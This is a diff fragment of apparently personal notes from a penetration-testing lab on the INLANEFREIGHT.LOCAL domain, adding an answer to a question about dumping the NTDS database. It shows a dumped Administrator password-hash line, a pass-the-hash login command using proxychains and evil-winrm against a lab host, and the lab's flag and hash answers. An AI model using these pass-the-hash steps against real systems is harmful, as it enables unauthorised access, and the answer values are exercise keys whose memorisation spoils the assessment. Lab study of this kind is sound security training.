@@ -87,3 +87,6 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6a
 6) on sudo su KALI -> proxychains evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 
 7) once in -> cd .. -> cd Desktop -> type flag.txt -> 7c09eb1fff981654a3bb3b4a4e0d176a
 
+
+Question 3 - Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer. 
+1) all steps above on how to get admin hash which is: fd1f7e5564060258ea787ddbb6e6afa2
